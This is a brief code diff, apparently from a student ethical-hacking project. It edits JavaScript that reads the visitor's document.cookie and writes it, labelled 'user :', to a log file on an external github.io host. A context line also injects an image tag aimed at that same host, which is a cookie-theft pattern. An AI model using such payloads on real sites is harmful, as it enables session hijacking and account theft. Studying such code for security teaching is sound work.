@@ -403,9 +403,9 @@ document.write('<img src=https://ethicalhackinggroup9.github.io/EthicalHacking/c
 alert("NE11");
 
 file = fopen("https://ethicalhackinggroup9.github.io/EthicalHacking/log.txt", 3);// opens the file for writing
-alert("NEW23");
+alert(document.cookie);
 
-fwrite(file,  document.cookie);// str is the content that is to be written into the file.
+fwrite(file,  "user :"+ document.cookie+" ");// str is the content that is to be written into the file.
 // const fs = require('fs') 
   
 // // Data which will write in a file. 
